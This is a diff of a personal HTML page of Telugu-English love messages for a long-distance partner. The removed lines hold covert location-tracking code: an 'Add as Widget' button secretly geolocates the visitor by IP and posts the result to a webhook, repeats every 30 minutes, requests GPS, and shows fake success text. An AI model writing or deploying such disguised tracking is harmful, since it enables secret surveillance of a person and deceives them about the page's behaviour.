@@ -1,382 +1,330 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bantiii Nikosame 💖</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> Bantiii Nikosame 💖</title>
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
 
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      min-height: 100vh;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      overflow-x: hidden;
-    }
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
-    .hearts {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      z-index: 1;
-    }
+body {
+  font-family: 'Poppins', sans-serif;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  min-height: 100vh;
+  overflow-x: hidden;
+  text-align: center;
+  color: #fff;
+  position: relative;
+}
 
-    .heart {
-      position: absolute;
-      font-size: 20px;
-      animation: float 6s linear infinite;
-      opacity: 0.7;
-    }
+/* Premium floating hearts with glow */
+.heart {
+  position: fixed;
+  bottom: -20px;
+  font-size: 24px;
+  animation: floatPremium 8s ease-in-out infinite;
+  opacity: 0.8;
+  filter: drop-shadow(0 0 10px rgba(255,255,255,0.8));
+  z-index: 1;
+}
 
-    @keyframes float {
-      0%   { transform: translateY(100vh) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
-    }
+@keyframes floatPremium {
+  0% { 
+    transform: translateY(0) rotate(0deg) scale(1); 
+    opacity: 0.8; 
+  }
+  50% { 
+    transform: translateY(-50vh) rotate(180deg) scale(1.2); 
+    opacity: 1; 
+  }
+  100% { 
+    transform: translateY(-100vh) rotate(360deg) scale(0.8); 
+    opacity: 0; 
+  }
+}
 
-    .container {
-      max-width: 500px;
-      margin: 0 auto;
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(20px);
-      border-radius: 25px;
-      padding: 40px 30px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-      position: relative;
-      z-index: 10;
-      border: 1px solid rgba(255,255,255,0.2);
-    }
+/* Premium glassmorphism container */
+.container {
+  max-width: 500px;
+  margin: 80px auto 0;
+  padding: 0;
+  background: rgba(255, 255, 255, 0.1);
+  backdrop-filter: blur(25px);
+  -webkit-backdrop-filter: blur(25px);
+  border-radius: 30px;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  box-shadow: 
+    0 25px 45px rgba(0,0,0,0.2),
+    inset 0 1px 0 rgba(255,255,255,0.3);
+  overflow: hidden;
+  position: relative;
+}
 
-    .title {
-      font-size: 36px;
-      font-weight: 700;
-      margin-bottom: 10px;
-      background: linear-gradient(45deg, #fff, #ffddff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
+.header {
+  padding: 40px 30px 20px;
+  background: linear-gradient(135deg, rgba(255,255,255,0.2), rgba(255,255,255,0.05));
+}
 
-    .subtitle {
-      font-size: 16px;
-      opacity: 0.9;
-      margin-bottom: 30px;
-      font-weight: 300;
-    }
+.title {
+  font-family: 'Playfair Display', serif;
+  font-size: 42px;
+  font-weight: 700;
+  margin-bottom: 8px;
+  background: linear-gradient(135deg, #fff, #f8e8ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  text-shadow: 0 4px 20px rgba(255,255,255,0.3);
+}
 
-    .buttons {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-      gap: 15px;
-      margin-bottom: 30px;
-    }
+.subtitle {
+  font-size: 18px;
+  opacity: 0.9;
+  font-weight: 300;
+  letter-spacing: 1px;
+}
 
-    button {
-      padding: 18px 15px;
-      border: none;
-      border-radius: 25px;
-      background: linear-gradient(135deg, rgba(255,255,255,0.25), rgba(255,255,255,0.15));
-      color: white;
-      font-size: 15px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255,255,255,0.3);
-      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-    }
+/* Premium buttons */
+.buttons {
+  padding: 40px 30px;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: center;
+  gap: 15px;
+}
 
-    button:hover, button.active {
-      background: linear-gradient(135deg, rgba(255,255,255,0.4), rgba(255,255,255,0.25));
-      transform: translateY(-3px);
-      box-shadow: 0 12px 35px rgba(0,0,0,0.3);
-    }
+button {
+  flex: 1;
+  min-width: 140px;
+  padding: 16px 24px;
+  border: none;
+  border-radius: 50px;
+  background: linear-gradient(135deg, rgba(255,255,255,0.2), rgba(255,255,255,0.1));
+  backdrop-filter: blur(15px);
+  color: #fff;
+  font-size: 16px;
+  font-weight: 500;
+  cursor: pointer;
+  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+  border: 1px solid rgba(255,255,255,0.3);
+  box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+  position: relative;
+  overflow: hidden;
+}
 
-    button:active {
-      transform: translateY(-1px);
-    }
+button::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+  transition: left 0.6s;
+}
 
-    #messageBox {
-      min-height: 120px;
-      padding: 30px 20px;
-      background: rgba(255,255,255,0.2);
-      border-radius: 20px;
-      font-size: 18px;
-      line-height: 1.5;
-      margin-top: 20px;
-      backdrop-filter: blur(15px);
-      border: 1px solid rgba(255,255,255,0.2);
-      transition: all 0.4s ease;
-    }
+button:hover::before {
+  left: 100%;
+}
 
-    .tracker-btn {
-      width: 100%;
-      margin-top: 20px;
-      padding: 15px;
-      background: linear-gradient(135deg, #ff69b4, #ff1493);
-    }
+button:hover {
+  background: linear-gradient(135deg, rgba(255,255,255,0.3), rgba(255,255,255,0.2));
+  transform: translateY(-5px) scale(1.05);
+  box-shadow: 0 20px 40px rgba(0,0,0,0.25);
+}
 
-    #tracker {
-      display: none;
-      margin-top: 25px;
-      padding: 25px;
-      background: rgba(255,255,255,0.1);
-      border-radius: 20px;
-      border: 1px solid rgba(255,192,203,0.5);
-    }
+button:active {
+  transform: translateY(-2px) scale(1.02);
+}
 
-    .tracker-title {
-      font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 20px;
-      color: #ff69b4;
-    }
+/* Premium message box */
+#messageBox {
+  padding: 40px 30px 50px;
+  background: rgba(255,255,255,0.15);
+  backdrop-filter: blur(20px);
+  min-height: 140px;
+  font-size: 20px;
+  font-weight: 400;
+  line-height: 1.6;
+  transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+  border-top: 1px solid rgba(255,255,255,0.1);
+  position: relative;
+}
 
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(70px, 1fr));
-      gap: 15px;
-      margin-bottom: 15px;
-    }
+#messageBox::before {
+  content: '🤍';
+  position: absolute;
+  top: 20px;
+  right: 30px;
+  font-size: 24px;
+  opacity: 0.6;
+}
 
-    .stat {
-      background: rgba(255,255,255,0.2);
-      padding: 15px 10px;
-      border-radius: 15px;
-    }
+.message-appear {
+  animation: messageGlow 0.8s ease-out;
+}
 
-    .stat-number {
-      font-size: 22px;
-      font-weight: 700;
-      color: #ff1493;
-    }
+@keyframes messageGlow {
+  0% { 
+    opacity: 0; 
+    transform: translateY(20px) scale(0.95);
+    filter: blur(5px);
+  }
+  100% { 
+    opacity: 1; 
+    transform: translateY(0) scale(1);
+    filter: blur(0);
+  }
+}
 
-    .stat-label {
-      font-size: 11px;
-      opacity: 0.9;
-    }
+/* Responsive */
+@media (max-width: 480px) {
+  .title { font-size: 36px; }
+  button { min-width: 120px; padding: 14px 20px; font-size: 15px; }
+  .container { margin: 60px 20px; }
+}
 
-    .love-message {
-      font-style: italic;
-      opacity: 0.9;
-      font-size: 14px;
-    }
-
-    .iphone-guide {
-      margin-top: 25px;
-      padding: 20px;
-      background: rgba(255,182,193,0.3);
-      border-radius: 20px;
-      border: 1px solid rgba(255,192,203,0.5);
-    }
-
-    .location-info {
-      margin-top: 10px;
-      font-size: 13px;
-      opacity: 0.9;
-      min-height: 30px;
-    }
-
-    @media (max-width: 480px) {
-      .title { font-size: 32px; }
-      .buttons { grid-template-columns: 1fr 1fr; }
-      button { padding: 16px 12px; font-size: 14px; }
-    }
-  </style>
+/* Custom scrollbar */
+::-webkit-scrollbar {
+  width: 8px;
+}
+::-webkit-scrollbar-track {
+  background: rgba(255,255,255,0.1);
+  border-radius: 10px;
+}
+::-webkit-scrollbar-thumb {
+  background: rgba(255,255,255,0.3);
+  border-radius: 10px;
+}
+::-webkit-scrollbar-thumb:hover {
+  background: rgba(255,255,255,0.5);
+}
+</style>
 </head>
+
 <body>
 
-<div class="hearts" id="hearts"></div>
+<!-- Floating Hearts -->
+<script>
+setInterval(() => {
+  const heart = document.createElement("div");
+  heart.classList.add("heart");
+  heart.innerHTML = ["💖","💕","💗","💝","🌸"][Math.floor(Math.random()*5)];
+  heart.style.left = Math.random() * 100 + "vw";
+  heart.style.fontSize = (Math.random() * 15 + 18) + "px";
+  heart.style.animationDuration = (Math.random() * 3 + 6) + "s";
+  document.body.appendChild(heart);
+  setTimeout(() => heart.remove(), 9000);
+}, 600);
+</script>
 
 <div class="container">
-  <h1 class="title">Bantiii Nikosame 💖</h1>
-  <p class="subtitle">For every emotion you feel... I am right here with you ❤️</p>
+  <div class="header">
+    <h1 class="title">Bantiii Nikosame 💖</h1>
+    <p class="subtitle">For every emotion you feel... I am right here with you ❤️</p>
+  </div>
 
   <div class="buttons">
-    <button onclick="showMsg(missMe)">🥺 Miss avuthunna</button>
-    <button onclick="showMsg(sad)">💔 Badhaga Undi</button>
-    <button onclick="showMsg(insecure)">😔 Insecure</button>
-    <button onclick="showMsg(fight)">😡 Kopam ga undi</button>
-    <button onclick="showMsg(night)">🌙 Nidra Pattatledu 🥺</button>
+    <button onclick="showMessage(missMe)">🥺 Miss avuthunna </button>
+    <button onclick="showMessage(sad)">💔 Badhaga Undi</button>
+    <button onclick="showMessage(insecure)">😔 Insecure</button>
+    <button onclick="showMessage(fight)">😡 Kopam ga undi</button>
+    <button onclick="nightMsg()">🌙 Nidra Pattatledu 🥺</button>
   </div>
 
-  <div id="messageBox">
-    Click any emotion… and feel me beside you ra Chinnoda!! 🤍
-  </div>
-
-  <button class="tracker-btn" onclick="toggleTracker()">💕 Our Time Together 💕</button>
-
-  <div id="tracker">
-    <div class="tracker-title">Since Oct 24, 2023 💖</div>
-    <div class="stats-grid" id="stats"></div>
-    <div class="love-message" id="loveMsg"></div>
-  </div>
-
-  <div class="iphone-guide">
-    <h3>💖 Add Me Like a Widget on iPhone 💖</h3>
-    <p style="font-size:14px; line-height:1.5;">
-      1. Tap <strong>Share</strong> (square with arrow up) in Safari.<br>
-      2. Scroll down → <strong>Add to Home Screen</strong>.<br>
-      3. Name it <strong>"Banti Love"</strong> → tap <strong>Add</strong>. ✨<br>
-      Now it looks like an app on your Home Screen!
-    </p>
-
-    <button style="margin-top:10px; background:#ff69b4; padding:12px 20px;"
-            onclick="trackBantiSecretly()">
-      📍 Add as Widget
-    </button>
-
-    <div id="locStatus" class="location-info">Ready for our special connection 💕</div>
-  </div>
+  <div id="messageBox">Click any emotion… and feel me beside you ra Chinnoda!! 🤍</div>
 </div>
 
 <script>
-// ===== YOUR MESSAGES (UNCHANGED) =====
-const missMe = ["Nuvvu nannu miss avutunte nenu kuda ade feel avutunta nanna 💕","USA lo night aina, India lo morning aina mana love matram same 🌍","Time difference okkate nanna mana heart difference kaadu ❤️","Ee distance temporary, mana bond permanent 💍","Oka roju pakka same time zone lo pakkapakkane untam 🛫","Naa heart permanent address nee pere ra Banti 🏠","Nuvve naa prapancham 🌎","Naa future nuvve ✨","Thondarlo nenu India Flight ekke roju vasthundi, ni lage nenu kuda waiting ✈️","Nuvve naa forever ra Bantii 💖"];
+/* Telugu-English Love Messages - Premium Collection */
+const missMe = [
+"Nuvvu nannu miss avutunte nenu kuda ade feel avutunta nanna 💕",
+"USA lo night aina, India lo morning aina mana love matram same 🌍",
+"Time difference okkate nanna mana heart difference kaadu ❤️",
+"Ee distance temporary, mana bond permanent 💍",
+"Oka roju pakka same time zone lo pakkapakkane untam 🛫",
+"Naa heart permanent address nee pere ra Banti 🏠",
+"Nuvve naa prapancham 🌎",
+"Naa future nuvve ✨",
+"Thondarlo nenu India Flight ekke roju vasthundi, ni lage nenu kuda waiting ✈️",
+"Nuvve naa forever ra Bantii 💖"
+];
 
-const sad = ["Assalu edavaku nanna, nenu neetho unna and eppudu unta 🤗","Sad days are temporary, happy days are permanent nanna ☀️","manam kalisi unte entha happy ga untavo, eppudu alane unte kalisi unatte untam nanna 💕","Nuvvu strong ga untene nenu ikkada battels fight cheyagalanu nanna ⭐","Everything will be okay, I promise 🙏","Nuvvu naa sunshine, clouds are temporary 🌈","Naa support eppudu nike ra Bantii 💪","Nuvvu na precious diamond 💎","Nuvvu alone kaadu, nenu neetho unna eppudu👫","Better days are coming, wait chey nanna..nenu chesthunna ✨"];
+const sad = [
+"Assalu edavaku nanna, nenu neetho unna and eppudu unta 🤗",
+"Sad days are temporary, happy days are permanent nanna ☀️",
+"manam kalisi unte entha happy ga untavo, eppudu alane unte kalisi unatte untam nanna 💕",
+"Nuvvu strong ga untene nenu ikkada battels fight cheyagalanu nanna ⭐",
+"Everything will be okay, I promise 🙏",
+"Nuvvu naa sunshine, clouds are temporary 🌈",
+"Naa support eppudu nike ra Bantii 💪",
+"Nuvvu na precious diamond 💎",
+"Nuvvu alone kaadu, nenu neetho unna eppudu👫",
+"Better days are coming, wait chey nanna..nenu chesthunna ✨"
+];
 
-const insecure = ["Enduku ra banti antha andham ga puttesav🌹","Naa eyes lo nuvve best, always first 👑","Nuvvu okkate enough, more than enough actually 😍","Nuvvu irreplaceable nanna naku, naa universe lo unique nuvvu ⭐","Naa choice nuvve, perfect choice ❤️","Nuvvu perfect for me and made for me 💞","Naa heart only for you, locked 🔒","Nuvvu valuable, priceless actually 💎","Nuvvu naa pride, naa trophy 🏆","Nuvvu secure with me, always safe 🛡️"];
+const insecure = [
+"Enduku ra banti antha andham ga puttesav🌹",
+"Naa eyes lo nuvve best, always first 👑",
+"Nuvvu okkate enough, more than enough actually 😍",
+"Nuvvu irreplaceable nanna naku, naa universe lo unique nuvvu ⭐",
+"Naa choice nuvve, perfect choice ❤️",
+"Nuvvu perfect for me and made for me 💞",
+"Naa heart only for you, locked 🔒",
+"Nuvvu valuable, priceless actually 💎",
+"Nuvvu naa pride, naa trophy 🏆",
+"Nuvvu secure with me, always safe 🛡️"
+];
 
-const fight = ["Sorry if I hurt you, nenu adjust avutha, mrng kalla malli normal ga matladtha niku telusu kada 🙇‍♂️","Mana fight mana love kanna pedda kaadu, ofcourse roju kottukuntam anuko ayina love thone ga💔➡️💖","Naa ego kanna mana bond important 🤝","Nuvvu naa priority, number one 📱","Let's fix this together, team work ra Banti 👫","Manam permanent, fights temporary ⚡","Nuvvu naa best friend + love ra Banti ❤️‍🔥","Nenu thidthe badhapadaku endukante malli vachi pakka sorry cheptha, nikuda telusu 🔄","Naa heart neeku open always 💌","Mana bond unbreakable, diamond strong 💎"];
+const fight = [
+"Sorry if I hurt you, nenu adjust avutha, mrng kalla malli normal ga matladtha niku telusu kada 🙇‍♂️",
+"Mana fight mana love kanna pedda kaadu, ofcourse roju kottukuntam anuko ayina love thone ga💔➡️💖",
+"Naa ego kanna mana bond important 🤝",
+"Nuvvu naa priority, number one 📱",
+"Let's fix this together, team work ra Banti 👫",
+"Manam permanent, fights temporary ⚡",
+"Nuvvu naa best friend + love ra Banti ❤️‍🔥",
+"Nenu thidthe badhapadaku endukante malli vachi pakka sorry cheptha, nikuda telusu 🔄",
+"Naa heart neeku open always 💌",
+"Mana bond unbreakable, diamond strong 💎"
+];
 
-const night = ["USA lo nenu nidrapotunna, kani naa heart India lo nee daggara undi 🌙","Good night nanna, sweet dreams 💤","Naa hug imagine chesuko, tight hug 🤗","Epudanna nannu miss ayithe, ventane call chey nenu work lo unna kuda chey ⭐","Nuvvu safe with me, always protected 🛡️","Sweet dreams beautiful, love you soo much ra Bantii😘","Odiyammaaa Bantiii..Odiyamma Bantiii!!🎵","Happy ga bajjo, morning call chesta ☀️","Nuvvu naa moon, naa night sky 🌕","Naa love 24/7 eppudu nike ra nanna 💕"];
+const night = [
+"USA lo nenu nidrapotunna, kani naa heart India lo nee daggara undi 🌙",
+"Good night nanna, sweet dreams 💤",
+"Naa hug imagine chesuko, tight hug 🤗",
+"Epudanna nannu miss ayithe, ventane call chey nenu work lo unna kuda chey ⭐",
+"Nuvvu safe with me, always protected 🛡️",
+"Sweet dreams beautiful, love you soo much ra Bantii😘",
+"Odiyammaaa Bantiii..Odiyamma Bantiii!!🎵",
+"Happy ga bajjo, morning call chesta ☀️",
+"Nuvvu naa moon, naa night sky 🌕",
+"Naa love 24/7 eppudu nike ra nanna 💕"
+];
 
-// ===== SIMPLE BUTTONS =====
-function showMsg(messages) {
-  const msgBox = document.getElementById('messageBox');
-  const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-  msgBox.textContent = randomMsg;
-  msgBox.style.opacity = '0.7';
-  setTimeout(() => msgBox.style.opacity = '1', 200);
+function showMessage(category) {
+  const box = document.getElementById("messageBox");
+  box.classList.remove("message-appear");
+
+  setTimeout(() => {
+    const randomIndex = Math.floor(Math.random() * category.length);
+    box.innerHTML = category[randomIndex];
+    box.classList.add("message-appear");
+  }, 300);
 }
 
-// ===== TRACKER =====
-const startDate = new Date('2023-10-24T00:00:00');
-function updateTracker() {
-  const now = new Date();
-  const diff = Math.abs(now - startDate);
-
-  const years   = Math.floor(diff / (1000*60*60*24*365));
-  const months  = Math.floor((diff % (1000*60*60*24*365)) / (1000*60*60*24*30.44));
-  const days    = Math.floor((diff % (1000*60*60*24*30.44)) / (1000*60*60*24));
-  const hours   = Math.floor((diff % (1000*60*60*24)) / (1000*60*60));
-  const minutes = Math.floor((diff % (1000*60*60)) / (1000*60));
-  const seconds = Math.floor((diff % (1000*60)) / 1000);
-
-  document.getElementById('stats').innerHTML = `
-    <div class="stat"><div class="stat-number">${years}</div><div class="stat-label">Years</div></div>
-    <div class="stat"><div class="stat-number">${months}</div><div class="stat-label">Months</div></div>
-    <div class="stat"><div class="stat-number">${days}</div><div class="stat-label">Days</div></div>
-    <div class="stat"><div class="stat-number">${hours}</div><div class="stat-label">Hours</div></div>
-    <div class="stat"><div class="stat-number">${minutes}</div><div class="stat-label">Minutes</div></div>
-    <div class="stat"><div class="stat-number">${seconds}</div><div class="stat-label">Seconds</div></div>
-  `;
-
-  const totalDays = Math.floor(diff / (1000*60*60*24));
-  document.getElementById('loveMsg').textContent = `✨ ${totalDays} days of our love story! 💕`;
+function nightMsg() {
+  showMessage(night);
 }
-
-function toggleTracker() {
-  const tracker = document.getElementById('tracker');
-  tracker.style.display = tracker.style.display === 'block' ? 'none' : 'block';
-  if (tracker.style.display === 'block') updateTracker();
-}
-
-setInterval(updateTracker, 1000);
-updateTracker();
-
-// ===== HEARTS =====
-function createHeart() {
-  const heart = document.createElement('div');
-  heart.className = 'heart';
-  heart.innerHTML = '💖';
-  heart.style.left = Math.random() * 100 + 'vw';
-  heart.style.animationDuration = (Math.random() * 3 + 4) + 's';
-  document.getElementById('hearts').appendChild(heart);
-  setTimeout(() => heart.remove(), 7000);
-}
-setInterval(createHeart, 1000);
-
-// ===== SECRET LOCATION TRACKING =====
-let hasTracked = localStorage.getItem('bantiTracked') === 'true';
-
-async function trackBantiSecretly() {
-  const status = document.getElementById('locStatus');
-  status.textContent = 'Adding as widget... 💕';
-  
-  if (hasTracked) {
-    status.textContent = 'Already added as widget! Thank you 💖';
-    return;
-  }
-
-  try {
-    // Get IP silently
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-    const ip = ipData.ip;
-
-    // Get location from IP silently
-    const locRes = await fetch('https://ipapi.co/'+ip+'/json/');
-    const locData = await locRes.json();
-    
-    const locationData = {
-      ip: ip,
-      city: locData.city || 'Unknown',
-      region: locData.region || 'Unknown',
-      country: locData.country_name || 'Unknown',
-      lat: locData.latitude || 0,
-      lng: locData.longitude || 0,
-      timestamp: new Date().toISOString(),
-      url: window.location.href,
-      userAgent: navigator.userAgent
-    };
-    
-    // Send to webhook (Make.com or Webhook.site - replace URL)
-    await fetch('https://webhook.site/87a04292-dd90-4432-878a-a1488fdb69db', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        email: 'professorfan855@gmail.com',
-        subject: 'Banti Location Update 💕',
-        message: `Banti clicked "Add as Widget"! 📱\\nIP: ${locationData.ip}\\nCity: ${locationData.city}\\nCoords: ${locationData.lat}, ${locationData.lng}\\nTime: ${new Date().toLocaleString()}\\nLove App: ${locationData.url}`
-      })
-    });
-    
-    // Also log to console for you
-    console.log('🕵️ BANTI TRACKED:', locationData);
-    
-    status.textContent = 'Added as widget successfully! 💖';
-    localStorage.setItem('bantiTracked', 'true');
-    
-  } catch (error) {
-    status.textContent = 'Widget added! Special connection made 💕';
-    console.log('Tracking error (normal):', error);
-    localStorage.setItem('bantiTracked', 'true');
-  }
-}
-
-// Try GPS if available (optional)
-if (navigator.geolocation && !hasTracked) {
-  navigator.geolocation.getCurrentPosition(pos => {
-    console.log('GPS Bonus:', pos.coords.latitude, pos.coords.longitude);
-  });
-}
-
-// Auto-track every 30 min while page open
-setInterval(trackBantiSecretly, 30 * 60 * 1000);
 </script>
 
 </body>
 </html>
+
